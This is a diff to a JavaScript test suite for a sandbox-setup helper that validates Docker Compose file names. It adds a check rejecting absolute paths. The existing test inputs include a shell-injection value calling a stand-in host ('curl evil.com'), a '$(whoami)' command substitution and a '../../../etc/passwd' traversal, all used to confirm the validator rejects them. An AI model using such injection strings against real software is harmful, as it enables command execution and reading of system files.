@@ -42,11 +42,12 @@ describe('sandbox-setup helpers', () => {
       expect(validateComposeFile('infra/docker-compose.yml')).toBe(true);
     });
 
-    it('rejects compose file names with shell injection', () => {
+    it('rejects compose file names with shell injection or absolute paths', () => {
       expect(validateComposeFile('foo.yml; curl evil.com')).toBe(false);
       expect(validateComposeFile('$(whoami).yml')).toBe(false);
       expect(validateComposeFile('file.txt')).toBe(false);
       expect(validateComposeFile('../../../etc/passwd')).toBe(false);
+      expect(validateComposeFile('/etc/docker-compose.yml')).toBe(false);
     });
   });
 });
